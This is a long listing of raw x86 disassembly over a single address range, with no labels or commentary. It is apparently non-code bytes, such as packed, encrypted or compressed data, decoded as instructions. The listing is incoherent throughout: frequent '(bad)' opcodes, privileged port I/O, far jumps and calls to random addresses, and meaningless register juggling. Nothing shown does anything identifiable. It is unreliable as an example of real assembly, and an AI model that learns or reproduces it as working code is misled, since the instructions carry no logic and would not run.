  4114ee:	sub    DWORD PTR [edx+0x1d],0x6c1b692
  4114f5:	push   edx
  4114f6:	xor    dl,bh
  4114f8:	pop    ds
  4114f9:	adc    bl,BYTE PTR [edx+0x4f0c9375]
  4114ff:	mov    cs,WORD PTR [ecx]
  411501:	es test cl,al
  411504:	xchg   BYTE PTR [esi+0x2f],ah
  411507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411508:	pop    ebx
  411509:	retf   
  41150a:	mov    al,0x58
  41150c:	out    0x61,al
  41150e:	rcl    DWORD PTR [edi-0x25471c94],1
  411514:	mov    eax,ds:0xd48aa6d0
  411519:	iret   
  41151a:	fstp   TBYTE PTR [ebx-0x2ed511d9]
  411520:	fiadd  WORD PTR [ecx-0x39a516bf]
  411526:	mov    edi,0x2c362cb6
  41152b:	sbb    al,ah
  41152d:	mov    al,ds:0x7396e1a9
  411532:	daa    
  411533:	jnp    0x41154a
  411535:	add    eax,DWORD PTR [edi]
  411537:	push   0xb812323e
  41153c:	scas   al,BYTE PTR es:[edi]
  41153d:	gs stos BYTE PTR es:[edi],al
  41153f:	or     bh,dh
  411541:	push   ebx
  411542:	push   es
  411543:	sbb    DWORD PTR [edx+0x2eff0b9d],ebp
  411549:	jle    0x4114cb
  41154b:	inc    ebp
  41154c:	bndldx bnd1,[esi]
  41154f:	mov    edx,0x8aec3834
  411554:	sahf   
  411555:	(bad)  
  411556:	push   eax
  411557:	data16 lock adc al,0x3c
  41155b:	inc    ebp
  41155c:	loopne 0x41152f
  41155e:	ss out dx,al
  411560:	mov    ch,0x42
  411562:	cli    
  411563:	mov    ch,0xf8
  411565:	jmp    0xc3d7f3e5
  41156a:	fmulp  st(3),st
  41156c:	jns    0x4115ba
  41156e:	ss jno 0x4114f1
  411571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411572:	pop    ebp
  411573:	xchg   edx,eax
  411574:	pushf  
  411575:	ins    BYTE PTR es:[edi],dx
  411576:	push   0xfc935f2a
  41157b:	push   edx
  41157c:	cmp    al,0xeb
  41157e:	imul   eax,DWORD PTR [esi+0x3e],0xffffff8d
  411582:	xchg   edx,eax
  411583:	mov    dl,0x37
  411585:	xor    ebx,DWORD PTR [edi-0x25f992b]
  41158b:	pop    ds
  41158c:	mov    edi,DWORD PTR [eax+0x24431438]
  411592:	and    eax,0x1859fc6a
  411597:	mov    bl,0xd0
  411599:	in     al,0x70
  41159b:	popf   
  41159c:	xchg   ebp,eax
  41159d:	inc    edi
  41159e:	dec    esp
  41159f:	push   esi
  4115a0:	mov    edi,0x9b35baa5
  4115a5:	test   al,0x7d
  4115a7:	sti    
  4115a8:	fdivr  QWORD PTR [eax+0x280bae78]
  4115ae:	jle    0x41157e
  4115b0:	aam    0x5f
  4115b2:	sub    ah,BYTE PTR [esi+0xa68a5f4]
  4115b8:	(bad)  
  4115b9:	test   eax,0x38d3aa7e
  4115be:	and    DWORD PTR [esi+0x316a2114],esi
  4115c4:	(bad)  
  4115c5:	fsub   st,st(7)
  4115c7:	ds add al,0xe7
  4115ca:	pop    ss
  4115cb:	dec    ebx
  4115cc:	and    al,BYTE PTR [eax-0xa]
  4115cf:	sbb    al,BYTE PTR [edi]
  4115d1:	fwait
  4115d2:	xor    bl,BYTE PTR [ebx]
  4115d4:	inc    ebx
  4115d5:	std    
  4115d6:	aam    0x4a
  4115d8:	jg     0x4115d7
  4115da:	stos   BYTE PTR es:[edi],al
  4115db:	rcr    cl,cl
  4115dd:	mov    ds:0x1d4b6163,al
  4115e2:	popf   
  4115e3:	sub    DWORD PTR [ecx],edi
  4115e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115e6:	sahf   
  4115e7:	sub    ebx,DWORD PTR [ecx+eiz*8-0x18]
  4115eb:	lahf   
  4115ec:	or     esi,eax
  4115ee:	outs   dx,DWORD PTR ds:[esi]
  4115ef:	mov    ebp,0xc5cc7417
  4115f4:	or     DWORD PTR [esi+eiz*4],ebp
  4115f7:	mov    dh,0xaa
  4115f9:	mov    al,0xa2
  4115fb:	xchg   edx,eax
  4115fc:	and    bl,BYTE PTR [edx+0x10]
  4115ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411600:	jmp    0xef9a4743
  411605:	or     bl,BYTE PTR [edi-0x1d]
  411608:	dec    esi
  411609:	mov    edx,0x5d3316b8
  41160e:	(bad)  
  41160f:	mov    al,ds:0x2cc6aa0e
  411614:	and    dh,bl
  411616:	std    
  411617:	jle    0x411632
  411619:	push   0x90c6cd27
  41161e:	xchg   esp,eax
  41161f:	inc    esi
  411620:	push   esi
  411621:	nop
  411622:	test   DWORD PTR ds:0xbff975f4,eax
  411628:	inc    eax
  411629:	push   cs
  41162a:	jge    0x41167d
  41162c:	xor    ecx,esi
  41162e:	sub    DWORD PTR [edi],esp
  411630:	mov    eax,0x75c9eb6a
  411635:	bound  esp,QWORD PTR [ecx+0x786e3304]
  41163b:	inc    ecx
  41163c:	mov    edi,0xb9f17c7b
  411641:	dec    esp
  411642:	xchg   ebx,eax
  411643:	mov    edi,0xd2c7613a
  411648:	add    ch,BYTE PTR [edi-0x66063af6]
  41164e:	es in  al,dx
  411650:	shl    BYTE PTR ds:[eax],0xed
  411654:	jno    0x41169e
  411656:	iret   
  411657:	cmp    al,0x80
  411659:	stc    
  41165a:	dec    edi
  41165b:	pop    es
  41165c:	ins    DWORD PTR es:[edi],dx
  41165d:	pusha  
  41165e:	dec    edi
  41165f:	push   esi
  411660:	nop
  411661:	inc    edx
  411662:	hlt    
  411663:	cli    
  411664:	jg     0x411664
  411666:	push   0x6b
  411668:	push   eax
  411669:	fwait
  41166a:	leave  
  41166b:	in     al,0x59
  41166d:	mov    dl,0x7c
  41166f:	fild   WORD PTR [ebp+0x59db0b82]
  411675:	cmc    
  411676:	mov    DWORD PTR [ebx+0x4bec44cd],ecx
  41167c:	cmp    esp,DWORD PTR [edi+0x38]
  41167f:	or     BYTE PTR ds:0x27de1787,ah
  411685:	adc    eax,0x50717abb
  41168a:	jmp    0xd593:0xc0850920
  411691:	mov    edi,0x77612abe
  411696:	fucomp st(1)
  411698:	mov    ah,0x3b
  41169a:	adc    ecx,DWORD PTR [esi]
  41169c:	cmp    al,BYTE PTR [edx+0x58d073c6]
  4116a2:	adc    ebx,DWORD PTR [ebp+ebp*8+0x19396b02]
  4116a9:	sti    
  4116aa:	mov    bh,0x31
  4116ac:	xchg   ebx,eax
  4116ad:	das    
  4116ae:	dec    edx
  4116af:	rcl    bh,0x62
  4116b2:	push   ss
  4116b3:	aad    0x0
  4116b5:	fldcw  WORD PTR [esi-0x138870ff]
  4116bb:	ins    BYTE PTR es:[edi],dx
  4116bc:	in     al,0xe2
  4116be:	mov    cl,BYTE PTR [ebx+0x78b16ef1]
  4116c4:	inc    ebx
  4116c5:	cmovbe ebx,DWORD PTR [ebx]
  4116c8:	jnp    0x41170b
  4116ca:	stos   DWORD PTR es:[edi],eax
  4116cb:	ret    0x1488
  4116ce:	mov    edx,0xe938f6a9
  4116d3:	(bad)  
  4116d4:	fisttp QWORD PTR [ebp+0x58c70c22]
  4116da:	cs inc esi
  4116dc:	das    
  4116dd:	sub    DWORD PTR [ebx+ebx*1],eax
  4116e0:	xchg   edx,eax
  4116e1:	loope  0x411743
  4116e3:	push   ds
  4116e4:	test   al,0xa7
  4116e6:	js     0x41166e
  4116e8:	inc    ecx
  4116e9:	add    BYTE PTR [ecx-0x70],0xcd
  4116ed:	or     ch,BYTE PTR [ecx]
  4116ef:	mov    WORD PTR [ebp-0x52],gs
  4116f2:	jp     0x411712
  4116f4:	push   esp
  4116f5:	aam    0x43
  4116f7:	js     0x41170f
  4116f9:	push   esp
  4116fa:	xor    al,0x14
  4116fc:	push   ds
  4116fd:	push   DWORD PTR [ebp+0x43fa28c5]
  411703:	add    edi,DWORD PTR [eax-0x2b]
  411706:	or     al,dl
  411708:	loopne 0x411705
  41170a:	cmp    al,0x2a
  41170c:	jg     0x41172a
  41170e:	pop    ebx
  41170f:	(bad)  
  411711:	icebp  
  411712:	lahf   
  411713:	ss test al,0x41
  411716:	sub    BYTE PTR [ebx],bl
  411718:	in     al,0x7a
  41171a:	mov    ds:0x3d656742,al
  41171f:	not    edi
  411721:	aam    0x6d
  411723:	inc    ebx
  411724:	jno    0x41172b
  411726:	jecxz  0x41170d
  411728:	shl    BYTE PTR cs:[ecx-0x34e054ef],cl
  41172f:	or     BYTE PTR [edi-0x2e],0x4d
  411733:	fwait
  411734:	push   edx
  411735:	(bad)  
  411736:	(bad)  
  411737:	sub    eax,0xc737bcbd
  41173c:	ror    bh,1
  41173e:	adc    al,0x60
  411740:	ins    BYTE PTR es:[edi],dx
  411741:	out    0xa2,eax
  411743:	xor    DWORD PTR [esi+0x51253c9],0xeaa867ce
  41174d:	lock or BYTE PTR [edi],0xe8
  411751:	stc    
  411752:	cli    
  411753:	in     eax,dx
  411754:	jl     0x411773
  411756:	cmp    al,BYTE PTR [ebx-0x2f]
  411759:	or     esi,ebx
  41175b:	(bad)  [edx+0x765c0bde]
  411761:	outs   dx,BYTE PTR ds:[esi]
  411762:	shr    esi,1
  411764:	push   edx
  411765:	and    al,0xa3
  411767:	dec    esp
  411768:	ins    BYTE PTR es:[edi],dx
  411769:	retf   
  41176a:	pusha  
  41176b:	es in  eax,0x1a
  41176e:	aaa    
  41176f:	mov    bh,0x1b
  411771:	out    dx,eax
  411772:	sub    edx,DWORD PTR ds:0xf06564e2
  411778:	or     ebp,ecx
  41177a:	cli    
  41177b:	xchg   esi,eax
  41177c:	repnz sub eax,0x7f0c632b
  411782:	cwde   
  411783:	sbb    al,dh
  411785:	sbb    cl,BYTE PTR [ebp-0x25]
  411788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411789:	out    0xd6,eax
  41178b:	adc    eax,0xff6c680d
  411790:	popf   
  411791:	mov    BYTE PTR ds:0xd8825377,0x70
  411798:	adc    eax,0x78b2532d
  41179d:	cmp    BYTE PTR [edi+0x1b12ad25],dh
  4117a3:	fldln2 
  4117a5:	jns    0x411765
  4117a7:	mov    ds:0x77b1e433,eax
  4117ac:	jo     0x411780
  4117ae:	pop    eax
  4117af:	das    
  4117b0:	jb     0x411801
  4117b2:	stos   DWORD PTR es:[edi],eax
  4117b3:	jg     0x41181f
  4117b5:	int    0x93
  4117b7:	bound  edx,QWORD PTR [ecx+0x7f96f17b]
  4117bd:	sbb    esp,DWORD PTR [ebx+0x73e637d1]
  4117c3:	loop   0x411788
  4117c5:	daa    
  4117c6:	cmp    DWORD PTR [eax-0x13],ebp
  4117c9:	loope  0x4117e9
  4117cb:	jne    0x41179b
  4117cd:	mov    eax,eax
  4117cf:	repz cmp ecx,DWORD PTR [ecx]
  4117d2:	out    dx,al
  4117d3:	cli    
  4117d4:	imul   edi,DWORD PTR [ecx],0xcc56f4e6
  4117da:	lods   al,BYTE PTR ds:[esi]
  4117db:	nop
  4117dc:	add    DWORD PTR [ecx+0x23d3dbb2],esp
  4117e2:	scas   al,BYTE PTR es:[edi]
  4117e3:	(bad)  
  4117e4:	pop    eax
  4117e5:	rcl    BYTE PTR [ebp+0x48],1
  4117e8:	and    ebp,edi
  4117ea:	mov    ebx,0x41046f84
  4117ef:	add    DWORD PTR [esi-0x58],esi
  4117f2:	fmul   DWORD PTR [ecx]
  4117f4:	or     BYTE PTR [edx],bh
  4117f6:	ins    WORD PTR es:[edi],dx
  4117f8:	shr    DWORD PTR [esi-0xc],1
  4117fb:	fwait
  4117fc:	test   BYTE PTR [esi-0x33],0x8f
  411800:	jae    0x4117be
  411802:	and    esp,DWORD PTR [edi]
  411804:	pop    eax
  411805:	outs   dx,DWORD PTR ds:[esi]
  411806:	call   0x914b62f3
  41180b:	aam    0x17
  41180d:	inc    esp
  41180e:	dec    ecx
  41180f:	pop    ebx
  411810:	xor    ecx,DWORD PTR [ebx]
  411812:	cmp    eax,esp
  411814:	add    ah,bl
  411816:	sbb    eax,0x7151998f
  41181b:	push   0xffffffc4
  41181d:	jg     0x4117d0
  41181f:	xor    al,0x55
  411821:	xchg   BYTE PTR ds:0x508f6efd,cl
  411827:	inc    eax
  411828:	jl     0x411840
  41182a:	mov    ebp,0xb35201a3
  41182f:	xor    BYTE PTR [edi+0x66eafce8],bh
  411835:	mov    esp,0x5964db37
  41183a:	push   edi
  41183b:	mov    eax,?
  41183d:	mov    ebp,0xa7036c8a
  411842:	in     eax,dx
  411843:	pushf  
  411844:	cdq    
  411845:	stos   DWORD PTR es:[edi],eax
  411846:	sti    
  411847:	call   DWORD PTR [ebp-0x307b8152]
  41184d:	xor    DWORD PTR [edx],0xd
  411850:	mov    ds:0x884a27c,eax
  411855:	test   bh,0x16
  411858:	lahf   
  411859:	or     edi,ebp
  41185b:	data16 hlt 
  41185d:	stos   DWORD PTR es:[edi],eax
  41185e:	fs out 0xd7,al
  411861:	push   0x5228ff03
  411866:	cmc    
  411867:	stos   BYTE PTR es:[edi],al
  411868:	aad    0xc5
  41186a:	jno    0x41185e
  41186c:	xor    ebx,DWORD PTR ds:0x6c9eff81
  411872:	add    eax,0x82a1acf5
  411877:	aad    0xca
  411879:	push   ds
  41187a:	or     BYTE PTR [eax],bh
  41187c:	repz sbb bh,al
  41187f:	cmp    cl,BYTE PTR [eax]
  411881:	lahf   
  411882:	mov    al,BYTE PTR [edx-0x3e]
  411885:	outs   dx,BYTE PTR ds:[esi]
  411886:	mov    BYTE PTR [edi+0x4e3621ca],dl
  41188c:	fs mov dl,0xff
  41188f:	or     eax,0x28d5764a
  411894:	div    DWORD PTR [ecx]
  411896:	cwde   
  411897:	pop    ecx
  411898:	xor    eax,0x74461ee9
  41189d:	nop
  41189e:	sahf   
  41189f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a0:	jne    0x411823
  4118a2:	das    
  4118a3:	(bad)  
  4118a4:	pop    es
  4118a5:	sub    DWORD PTR ds:0x651b0069,0xffffff82
  4118ac:	(bad)  
  4118ae:	mov    ebx,0x1314b395
  4118b3:	loop   0x41183a
  4118b5:	mov    ch,0x7d
  4118b7:	stos   BYTE PTR es:[edi],al
  4118b8:	adc    BYTE PTR [edi],bh
  4118ba:	mov    ch,0xc3
  4118bc:	pop    esi
  4118bd:	inc    ebx
  4118be:	paddsw mm3,QWORD PTR [edi]
  4118c1:	pushf  
  4118c2:	add    al,0xb9
  4118c4:	mov    dl,0x46
  4118c6:	js     0x411904
  4118c8:	mov    DWORD PTR [eax+ecx*4-0x16198576],ebx
  4118cf:	inc    ebp
  4118d0:	pop    edi
  4118d1:	adc    BYTE PTR [edi],cl
  4118d3:	xchg   BYTE PTR [edi+ebp*8-0x4c92d906],cl
  4118da:	int    0xb5
  4118dc:	add    eax,0xdf8b7082
  4118e1:	bound  edi,QWORD PTR [ebx-0x3f]
  4118e4:	hlt    
  4118e5:	pop    ss
  4118e6:	adc    edi,DWORD PTR [ecx-0x1d189339]
  4118ec:	fmulp  st(0),st
  4118ee:	rcl    BYTE PTR [ecx+0x593068c0],0xcc
  4118f5:	adc    BYTE PTR [edi-0x14],bl
  4118f8:	sbb    DWORD PTR [eax],esi
  4118fa:	adc    ecx,0xffffff88
  4118fd:	add    eax,0xecea3861
  411902:	aas    
  411903:	pop    ebx
  411904:	rol    DWORD PTR [edi],1
  411906:	ss retw 0x762
  41190b:	sti    
  41190c:	adc    ecx,DWORD PTR [esi-0x1d]
  41190f:	sub    ebp,ebx
  411911:	pop    edx
  411912:	xlat   BYTE PTR ds:[ebx]
  411913:	je     0x411924
  411915:	and    eax,0x3b66076f
  41191a:	xor    BYTE PTR [ecx],dl
  41191c:	or     cl,ch
  41191e:	xor    DWORD PTR [edi-0x48],eax
  411921:	inc    ecx
  411922:	push   es
  411923:	lock popa 
  411925:	(bad)  
  411926:	aaa    
  411927:	cli    
  411928:	retf   
  411929:	test   bl,dl
  41192b:	wbinvd 
  41192d:	jl     0x4118c6
  41192f:	xlat   BYTE PTR ds:[ebx]
  411930:	pop    edi
  411931:	clc    
  411932:	in     eax,0xc4
  411934:	in     al,dx
  411935:	push   esp
  411936:	sub    al,0x41
  411938:	popa   
  411939:	std    
  41193a:	or     al,0xc5
  41193c:	je     0x4118c3
  41193e:	mov    dh,0xae
  411940:	or     DWORD PTR [edx],esi
  411942:	sub    eax,0x6ffe08d0
  411947:	jge    0x411993
  411949:	mov    ds:0xfb5e2440,eax
  41194e:	addr16 std 
  411950:	xchg   ecx,esi
  411952:	xchg   edx,eax
  411954:	and    DWORD PTR es:[ebp-0x51],edi
  411958:	push   eax
  411959:	das    
  41195a:	cmc    
  41195b:	pop    ecx
  41195c:	xchg   ecx,eax
  41195d:	xchg   esi,eax
  41195e:	js     0x411916
  411960:	adc    eax,0x5d6aa0ee
  411965:	push   esi
  411966:	cmp    eax,0x3d340f75
  41196b:	xchg   edx,eax
  41196c:	fimul  DWORD PTR [ebx+0xac15bb2]
  411972:	and    eax,edi
  411974:	cmp    DWORD PTR [ecx+edx*2-0x6484268c],0xe517a910
  41197f:	pop    ecx
  411980:	push   ebx
  411981:	and    eax,0x2b8e10f9
  411986:	es pushfw 
  411989:	mov    eax,0xab906480
  41198e:	cli    
  41198f:	call   0x8a63982f
  411994:	add    BYTE PTR es:[edx-0x14814418],bl
  41199b:	daa    
  41199c:	or     dh,BYTE PTR [eax-0x4a]
  41199f:	test   DWORD PTR [esi-0x14b717d5],ecx
  4119a5:	and    al,0x79
  4119a7:	jge    0x411947
  4119a9:	lahf   
  4119aa:	inc    esp
  4119ab:	std    
  4119ac:	fwait
  4119ad:	or     DWORD PTR [ecx],edi
  4119af:	outs   dx,DWORD PTR ds:[esi]
  4119b0:	or     BYTE PTR [eax+0x38],cl
  4119b3:	xchg   ecx,eax
  4119b4:	adc    DWORD PTR [edi+eiz*1-0xe5d1d8],0xffffffac
  4119bc:	jge    0x411a29
  4119be:	(bad)  
  4119bf:	and    BYTE PTR [ebp-0x3d2c81a8],bl
  4119c5:	out    0x11,eax
  4119c7:	std    
  4119c8:	js     0x4119b4
  4119ca:	jnp    0x411975
  4119cc:	xor    al,0xb9
  4119ce:	imul   esp,DWORD PTR [ecx],0xffffffe0
  4119d1:	and    bl,cl
  4119d3:	mov    ds:0xd51558a0,eax
  4119d8:	or     al,0xa3
  4119da:	push   edx
  4119db:	bound  eax,QWORD PTR [eax-0x26]
  4119de:	std    
  4119df:	inc    esp
  4119e0:	lahf   
  4119e1:	or     esi,DWORD PTR [edx-0x4c]
  4119e4:	sub    eax,0x64f8a92d
  4119e9:	test   eax,0xda54636d
  4119ee:	push   ecx
  4119ef:	sub    DWORD PTR [esi],esp
  4119f1:	lods   al,BYTE PTR ds:[esi]
  4119f2:	xor    al,0xea
  4119f4:	mov    al,dh
  4119f6:	and    edx,DWORD PTR ds:0x27d132b6
  4119fc:	loope  0x4119e1
  4119fe:	push   esp
  4119ff:	in     al,dx
  411a00:	pop    ebp
  411a01:	mov    esp,fs
  411a03:	jl     0x411a17
  411a05:	cdq    
  411a06:	(bad)  
  411a08:	arpl   sp,bp
  411a0a:	jae    0x4119c0
  411a0c:	repz retf 
  411a0e:	pop    edx
  411a0f:	sub    ecx,DWORD PTR [ecx+0x3313d96]
  411a15:	lods   eax,DWORD PTR ds:[esi]
  411a16:	inc    BYTE PTR [edi-0x77]
  411a19:	iret   
  411a1a:	mov    bh,0x53
  411a1c:	inc    ecx
  411a1d:	jno    0x411a57
  411a1f:	adc    DWORD PTR ds:[edx+eax*1-0x65a7361e],edx
  411a27:	ins    BYTE PTR es:[edi],dx
  411a28:	les    eax,FWORD PTR [eax+0x5]
  411a2b:	loopne 0x411a96
  411a2d:	inc    ecx
  411a2e:	mov    cl,0x39
  411a30:	push   ss
  411a31:	arpl   WORD PTR [ebx],bx
  411a33:	adc    BYTE PTR [ecx],cl
  411a35:	scas   eax,DWORD PTR es:[edi]
  411a36:	sahf   
  411a37:	imul   esi,DWORD PTR [eax+ebx*8],0x666e4dbc
  411a3e:	sahf   
  411a3f:	int    0x16
  411a41:	mov    al,ds:0x7359b136
  411a46:	stc    
  411a47:	test   eax,0x96373df5
  411a4c:	pop    esi
  411a4d:	sub    DWORD PTR [eax],0x32fd6c5f
  411a53:	mov    al,ds:0x1a8d678f
  411a58:	pop    ebx
  411a59:	test   BYTE PTR [ecx],ch
  411a5b:	xor    al,0x66
  411a5d:	and    DWORD PTR [edi],0xffffffca
  411a60:	jno    0x411ad9
  411a62:	je     0x411ab5
  411a64:	jns    0x411a7a
  411a66:	pop    esp
  411a67:	jns    0x411a0b
  411a69:	lock sbb BYTE PTR [edx],cl
  411a6c:	push   edi
  411a6d:	enter  0x8936,0x34
  411a71:	jbe    0x411a71
  411a73:	neg    BYTE PTR [esi+0x4909eb36]
  411a79:	mov    ebx,0xc23e8436
  411a7e:	mov    DWORD PTR [bx+di+0x20],edx
  411a82:	clc    
  411a83:	clc    
  411a84:	and    BYTE PTR [edx-0x71],al
  411a87:	mov    ds:0xfb399a51,eax
  411a8c:	push   esi
  411a8d:	pop    ecx
  411a8e:	adc    esp,DWORD PTR [esi-0x51]
  411a91:	loope  0x411a43
  411a93:	push   esp
  411a94:	sbb    bl,al
  411a96:	pop    ebx
  411a97:	push   ebx
  411a98:	shl    DWORD PTR [ebp-0x6d],cl
  411a9b:	pop    esp
  411a9c:	mov    eax,0x129ef390
  411aa1:	add    BYTE PTR [ebx+0x59],al
  411aa4:	daa    
  411aa5:	ss sbb al,0xa5
  411aa8:	inc    edx
  411aa9:	xor    BYTE PTR [edx],0x10
  411aac:	and    al,0x3d
  411aae:	cdq    
  411aaf:	fbld   TBYTE PTR [edi+0x11d79775]
  411ab5:	sub    ebp,DWORD PTR [ebx]
  411ab7:	pop    es
  411ab8:	add    DWORD PTR [esi],ecx
  411aba:	stos   DWORD PTR es:[edi],eax
  411abb:	jecxz  0x411b32
  411abd:	sbb    al,0xdd
  411abf:	inc    ebp
  411ac0:	aam    0x73
  411ac2:	shl    DWORD PTR [ebp-0x17cab401],cl
  411ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac9:	push   ds
  411aca:	sti    
  411acb:	mov    cl,0x4f
  411acd:	mov    esi,0xe4d95c0c
  411ad2:	or     al,0x2d
  411ad4:	je     0x411b42
  411ad6:	mov    edx,0xe887782a
  411adb:	pop    esi
  411adc:	dec    ecx
  411add:	xchg   DWORD PTR [edi],ebp
  411adf:	cli    
  411ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ae1:	xchg   BYTE PTR [ebx],al
  411ae3:	scas   eax,DWORD PTR es:[edi]
  411ae4:	popf   
  411ae5:	je     0x411b4a
  411ae7:	mov    ch,0x52
  411ae9:	test   DWORD PTR [eax+ecx*1],esp
  411aec:	test   eax,0xf5fbe9b9
  411af1:	or     eax,0x5e4ee225
  411af6:	(bad)  [ecx-0x1f]
  411af9:	and    al,0xa5
  411afb:	xor    dh,bh
  411afd:	and    ebx,DWORD PTR [ebx+eiz*8-0x3e9b3cd8]
  411b04:	push   0x8b63b4c0
  411b09:	out    0x30,eax
  411b0b:	pop    ebx
  411b0c:	ds pop edi
  411b0e:	push   ecx
  411b0f:	jb     0x411b4a
  411b11:	outs   dx,DWORD PTR ds:[esi]
  411b12:	shr    edx,0xb0
  411b15:	(bad)  
  411b16:	push   ds
  411b17:	sti    
  411b18:	fs sbb eax,0xf684f866
  411b1e:	lea    ebp,[ebp+0x56]
  411b21:	ret    
  411b22:	(bad)  
  411b23:	aam    0xb
  411b25:	jge    0x411b75
  411b27:	add    BYTE PTR [edi+edx*8-0x6f],ch
  411b2b:	jle    0x411b5b
  411b2d:	shr    BYTE PTR ds:0x9062c995,1
  411b33:	pop    edi
  411b34:	add    ah,BYTE PTR [ebp+0x43]
  411b37:	retf   
  411b38:	fist   WORD PTR [edx]
  411b3a:	(bad)  
  411b3b:	add    DWORD PTR ds:0xe67f6927,edi
  411b41:	sbb    al,0x9a
  411b43:	fcomp  QWORD PTR [ebp-0x27]
  411b46:	ss mov eax,0x4bc0688c
  411b4c:	xor    BYTE PTR [esi+0x3d117562],0x80
  411b53:	or     ah,BYTE PTR [ecx-0x3b417fa2]
  411b59:	stos   DWORD PTR es:[edi],eax
  411b5a:	or     edx,ecx
  411b5c:	push   ds
  411b5d:	int3   
  411b5e:	enter  0x4972,0xfd
  411b62:	xor    edi,DWORD PTR [edx]
  411b64:	sub    esp,DWORD PTR [esi+ebp*1-0x11]
  411b68:	dec    ebx
  411b69:	or     al,0x93
  411b6b:	xchg   ecx,eax
  411b6c:	xor    BYTE PTR [eax],0x47
  411b6f:	push   ebx
  411b70:	adc    ch,dh
  411b72:	push   si
  411b74:	rcl    BYTE PTR [ebp+0x2f20217c],cl
  411b7a:	cmp    BYTE PTR [edi],0x1a
  411b7d:	mov    dl,0x5a
  411b7f:	mov    DWORD PTR [edx+esi*1-0x7c5d0f2d],edx
  411b86:	je     0x411b9d
  411b88:	and    ebp,DWORD PTR [ebp-0x507edecd]
  411b8e:	xchg   ebx,eax
  411b8f:	lds    ecx,FWORD PTR [edx+0x14]
  411b92:	aaa    
  411b93:	or     bl,BYTE PTR [ebx]
  411b95:	mov    WORD PTR [esi+0x28],cs
  411b98:	enterw 0x644b,0xd1
  411b9d:	leave  
  411b9e:	loop   0x411bef
  411ba0:	inc    esi
  411ba1:	xchg   edi,eax
  411ba2:	(bad)  
  411ba4:	mov    ebp,0x60637fae
  411ba9:	gs and al,0x66
  411bac:	fwait
  411bad:	enter  0x1aef,0xcc
  411bb1:	in     eax,dx
  411bb2:	mov    ebp,0x47db4ac7
  411bb7:	and    al,0xf1
  411bb9:	(bad)  
  411bba:	je     0x411c34
  411bbc:	je     0x411bf6
  411bbe:	add    DWORD PTR [eax+0x451cfeac],esi
  411bc4:	(bad)  
  411bc5:	dec    esi
  411bc6:	aam    0x55
  411bc8:	push   ebx
  411bc9:	repz fpatan 
  411bcc:	xor    BYTE PTR [edx+edi*2+0x2d5da2d8],0x5f
  411bd4:	inc    esp
  411bd5:	or     ebp,DWORD PTR [ebx+0xe]
  411bd8:	mov    ds:0x366f0c65,al
  411bdd:	add    edx,DWORD PTR [ebx-0x11cc46e6]
  411be3:	inc    ebx
  411be4:	shl    DWORD PTR [ebx+0x577276e9],1
  411bea:	call   0x65f01d64
  411bef:	mov    al,ds:0xd7e78d4d
  411bf4:	sub    bh,bl
  411bf6:	push   ebp
  411bf7:	push   esi
  411bf8:	adc    eax,0xd3784bf9
  411bfe:	add    bh,ah
  411c00:	add    DWORD PTR [ebp+0x41c6e903],edx
  411c06:	adc    bl,BYTE PTR [esp+ecx*8-0xac335c3]
  411c0d:	dec    edx
  411c0e:	mov    ecx,DWORD PTR [ecx-0x615960b4]
  411c14:	scas   eax,DWORD PTR es:[edi]
  411c15:	xchg   si,ax
  411c17:	sbb    BYTE PTR [eax+0x78d4f318],ch
  411c1d:	(bad)  
  411c1f:	(bad)  
  411c20:	jle    0x411c21
  411c22:	repz aaa 
  411c24:	cld    
  411c25:	retf   
  411c26:	push   edx
  411c27:	pop    ds
  411c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c29:	mov    ds:0xf7cb57ac,al
  411c2e:	lea    ebx,[ebx-0x4850854f]
  411c34:	test   al,0x2d
  411c36:	out    0xe3,al
  411c38:	dec    esp
  411c39:	lock pop edi
  411c3b:	lds    edi,FWORD PTR [edx+0x2f7bac64]
  411c41:	clc    
  411c42:	push   edi
  411c43:	shr    BYTE PTR [edi+esi*2+0x32776cff],0xde
  411c4b:	add    esp,esp
  411c4d:	mov    esp,DWORD PTR [esi]
  411c4f:	push   ss
  411c50:	mov    ah,0x7b
  411c52:	rcl    cl,cl
  411c54:	cdq    
  411c55:	and    esi,ecx
  411c57:	mov    edi,0x989ce4ef
  411c5c:	mov    edi,0xc9d1b5a5
  411c61:	sub    ebp,DWORD PTR ds:0x360d7872
  411c67:	shl    BYTE PTR [eax],0xd1
  411c6a:	push   edx
  411c6b:	ror    ah,cl
  411c6d:	clc    
  411c6e:	stos   BYTE PTR es:[edi],al
  411c6f:	mov    dl,0xdb
  411c71:	popa   
  411c72:	xlat   BYTE PTR ds:[ebx]
  411c73:	jb     0x411c16
  411c75:	mov    al,0x15
  411c77:	xchg   edx,eax
  411c78:	jecxz  0x411c4f
  411c7a:	dec    ebx
  411c7b:	imul   esi,DWORD PTR [edi+0x2dae03fe],0x68d33ef3
  411c85:	mov    ds:0xd12ced9c,al
  411c8a:	mov    al,ds:0xda706f4a
  411c8f:	jmp    0x411c12
  411c91:	int3   
  411c92:	inc    ebx
  411c93:	pop    es
  411c94:	push   edi
  411c95:	jo     0x411cb7
  411c97:	sub    dl,dh
  411c99:	push   esp
  411c9a:	jp     0x411c99
  411c9c:	in     al,dx
  411c9d:	loope  0x411ceb
  411c9f:	mov    ecx,0x13a07cac
  411ca4:	mov    dh,0xe4
  411ca6:	(bad)  
  411ca7:	pusha  
  411ca8:	pusha  
  411ca9:	nop
  411caa:	jbe    0x411c6f
  411cac:	inc    ebx
  411cad:	(bad)  [esp+edi*8-0x7935b68]
  411cb4:	stos   BYTE PTR es:[edi],al
  411cb5:	lahf   
  411cb6:	retf   
  411cb7:	out    0x4d,eax
  411cb9:	scas   al,BYTE PTR es:[edi]
  411cba:	xchg   ebp,eax
  411cbb:	jmp    0x4bb1bbba
  411cc0:	push   cs
  411cc1:	retf   
  411cc2:	dec    ebx
  411cc3:	add    eax,0x89bc792e
  411cc8:	mov    ch,BYTE PTR [eax]
  411cca:	std    
  411ccb:	cwde   
  411ccc:	or     ebx,ebx
  411cce:	push   es
  411ccf:	adc    dl,cl
  411cd1:	pop    eax
